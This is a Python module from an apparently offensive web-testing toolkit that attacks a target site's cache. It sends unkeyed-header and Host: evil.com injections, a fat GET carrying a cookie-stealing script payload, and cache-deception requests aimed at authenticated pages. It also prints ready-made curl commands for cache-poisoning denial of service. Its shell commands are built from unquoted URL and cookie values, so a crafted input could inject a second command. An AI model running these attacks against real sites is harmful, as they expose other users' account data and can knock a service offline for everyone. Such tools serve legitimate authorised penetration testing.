"""
modules/cache_poisoning.py
tmrswrr - Web Cache Poisoning & Cache Deception
Header injection, cache key manipulation, fat GET, response splitting
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def cache_header_probe():
    section("CACHE DETECTION & HEADER ANALYSIS")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Analyzing cache behavior via response headers...")
    out, _, _ = run_cmd(f'curl -sk -I {url} -m 10', timeout=15)
    print(f"\n{NEON_CYN}Response Headers:{RST}")
    print(out[:1500])

    cache_indicators = {
        "x-cache":          "CDN/proxy cache present",
        "cf-cache-status":  "Cloudflare cache",
        "x-varnish":        "Varnish cache",
        "age:":             "Response served from cache (Age > 0)",
        "cache-control:":   "Cache-Control directive",
        "surrogate-key":    "Fastly/Varnish cache tags",
        "x-served-by":      "Fastly CDN",
        "x-cache-hits":     "Cache hit counter",
        "x-drupal-cache":   "Drupal page cache",
        "x-wp-cf-super-cache": "WordPress cache",
    }

    found_cache = []
    lower = out.lower()
    for header, desc in cache_indicators.items():
        if header in lower:
            success(f"Cache indicator: {header} ({desc})")
            found_cache.append(header)

    if found_cache:
        info("Caching is active - target may be vulnerable to cache poisoning")
    else:
        info("No obvious cache headers - might use private/no-store or be uncached")

    # Check cache-control directives
    cc_match = re.search(r"cache-control:\s*(.+)", out, re.I)
    if cc_match:
        cc = cc_match.group(1).strip()
        print(f"\n  {NEON_CYN}Cache-Control:{RST} {cc}")
        if "no-store" in cc or "private" in cc:
            info("Response is not cached - poisoning not applicable here")
        elif "public" in cc or "max-age" in cc:
            warn("Response is publicly cached - poisoning may be possible!")


def unkeyed_header_poison():
    section("UNKEYED HEADER CACHE POISONING")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Testing if unkeyed headers are reflected in cached responses...")
    info("If a header is reflected but NOT part of cache key → cache poisoning!")

    test_value = "yeepforge-poison-test-12345"

    headers_to_test = [
        ("X-Forwarded-Host",   test_value),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Forwarded-Proto",  "http"),
        ("X-Host",             test_value),
        ("X-Forwarded-Server", test_value),
        ("X-Original-URL",     "/poisoned"),
        ("X-Rewrite-URL",      "/poisoned"),
        ("X-Forwarded-Prefix", "/prefix"),
        ("X-Original-Host",    test_value),
    ]

    print()
    for header, value in headers_to_test:
        # Send request with test header
        out, _, _ = run_cmd(
            f'curl -sk {cookie_flag} -H "{header}: {value}" {url} -m 10'
        )
        # Check if our value is reflected
        if test_value in out or "poisoned" in out or "nothttps" in out:
            success(f"REFLECTED: {header}: {value}")
            warn("This header is reflected - check if it's in the cache key!")
            warn("If not in cache key → cache poisoning possible")
            add_vuln(f"Potential Cache Poisoning via {header}", "High", "A05:2021",
                     f"Header {header} is reflected in response body", url)
        else:
            # Check redirect
            redirect, _, _ = run_cmd(
                f'curl -sk {cookie_flag} -H "{header}: {value}" '
                f'-D - -o /dev/null {url} -m 10'
            )
            if "location:" in redirect.lower() and test_value in redirect.lower():
                success(f"REDIRECT via {header}: {value}")
                add_vuln(f"Cache Poisoning Redirect via {header}", "High", "A05:2021",
                         f"Header {header} influences redirect location", url)
            else:
                print(f"  {DIM}[-] {header}: not reflected{RST}")


def fat_get_poison():
    section("FAT GET / PARAMETER CLOAKING")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Testing 'fat GET' - GET request with body parameter override...")
    print(f"""
  {NEON_CYN}Fat GET Explanation:{RST}
    Cache key: GET /page?param=legit
    Body:      param=malicious
    If server uses body param but cache uses URL → poisoning!
""")

    param = prompt("Parameter to test (e.g. callback, utm_content, lang)")
    if not param:
        param = "utm_content"

    poison_value = "<script>alert(document.cookie)</script>"
    import urllib.parse
    enc = urllib.parse.quote(poison_value)

    out, _, _ = run_cmd(
        f'curl -sk {cookie_flag} -X GET '
        f'-H "Content-Type: application/x-www-form-urlencoded" '
        f'-d "{param}={enc}" {url}?{param}=legit -m 10'
    )

    if poison_value in out or "alert" in out:
        success(f"FAT GET REFLECTED: {param} body value appears in response!")
        add_vuln("Fat GET Cache Poisoning", "High", "A05:2021",
                 f"Body parameter {param} reflected without URL cache key", url)
    else:
        print(f"  {DIM}[-] Body parameter not reflected in response{RST}")


def cache_deception():
    section("WEB CACHE DECEPTION")
    url = _target()
    cookies = SESSION.get("cookies", "")

    info("Cache deception: tricking cache to store authenticated responses publicly")
    print(f"""
  {NEON_CYN}Cache Deception Attack:{RST}
    1. Victim visits: {url}/account/settings/nonexistent.css
    2. Server ignores .css extension → serves /account/settings (authenticated)
    3. Cache stores it (thinks it's a static CSS file)
    4. Attacker fetches same URL → gets victim's account data

  {NEON_CYN}Testing URLs (replace with your authenticated endpoints):{RST}
""")

    auth_paths = [
        "/account", "/profile", "/dashboard", "/settings",
        "/api/user/me", "/api/profile", "/user/settings",
    ]

    static_exts = [".css", ".js", ".png", ".ico", ".jpg", ".woff", ".gif"]

    cookies_flag = f'-b "{cookies}"' if cookies else ""

    info("Testing cache deception paths...")
    for path in auth_paths:
        for ext in static_exts[:3]:
            test_url = f"{url}{path}/test{ext}"
            # First request with auth (if cached, 2nd without auth should also get it)
            out, _, _ = run_cmd(
                f'curl -sk {cookies_flag} -o /dev/null -w "%{{http_code}}" {test_url} -m 5'
            )
            code = out.strip()
            if code == "200":
                # Try same URL without cookies
                out2, _, _ = run_cmd(
                    f'curl -sk -o /dev/null -w "%{{http_code}}" {test_url} -m 5'
                )
                code2 = out2.strip()
                if code2 == "200":
                    warn(f"POSSIBLE CACHE DECEPTION: {test_url}")
                    warn(f"  Auth: {code} | No-auth: {code2} - both 200!")
                    add_vuln("Web Cache Deception", "High", "A01:2021",
                             f"Authenticated content cached at {path}/test{ext}", test_url)
                else:
                    print(f"  {DIM}[-] {path}/test{ext} → auth:{code} noauth:{code2}{RST}")


def cache_poisoning_dos():
    section("CACHE POISONING DOS")
    url = _target()

    print(f"""
  {NEON_CYN}Cache Poisoning DoS - poison cache with error response:{RST}

  {NEON_GRN}Method 1: Host Header Poison → 404 cached{RST}
    curl -H "Host: notexist.internal" {url} -H "X-Forwarded-Host: notexist.internal"
    If server returns 404 and it gets cached → DoS for all users

  {NEON_GRN}Method 2: X-Forwarded-Port to cause port mismatch{RST}
    curl -H "X-Forwarded-Port: 1337" {url}

  {NEON_GRN}Method 3: Invalid X-HTTP-Method-Override{RST}
    curl -H "X-HTTP-Method-Override: DELETE" {url}
    If DELETE triggers error and caches → DoS

  {NEON_GRN}param=payload DoS - inject query param that causes error:{RST}
    curl "{url}?__invalid_param=crash"
    curl "{url}?callback=<script>" (if JSONP)
""")

    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Testing Host header injection (check if reflected in response)...")
    out, _, _ = run_cmd(
        f'curl -sk {cookie_flag} -H "Host: evil.com" '
        f'-H "X-Forwarded-Host: evil.com" {url} -m 10'
    )
    if "evil.com" in out:
        success("Host header reflected in response - cache poisoning via Host is possible!")
        add_vuln("Host Header Injection (Cache Poisoning)", "High", "A05:2021",
                 "evil.com Host header reflected in page content", url)
    else:
        print(f"  {DIM}[-] Host header not reflected{RST}")


def run():
    print_banner("CACHE POISONING / CACHE DECEPTION",
                 "Unkeyed Headers · Fat GET · Cache Deception · DoS")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Cache Detection & Header Analysis
  {NEON_CYN}[2]{RST} Unkeyed Header Poisoning {SOFT_WHITE}(X-Forwarded-Host, X-Host, etc.){RST}
  {NEON_CYN}[3]{RST} Fat GET / Parameter Cloaking
  {NEON_CYN}[4]{RST} Web Cache Deception {SOFT_WHITE}(steal cached auth responses){RST}
  {NEON_CYN}[5]{RST} Cache Poisoning DoS
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            cache_header_probe()
        elif c == "2":
            unkeyed_header_poison()
        elif c == "3":
            fat_get_poison()
        elif c == "4":
            cache_deception()
        elif c == "5":
            cache_poisoning_dos()
        save_session()
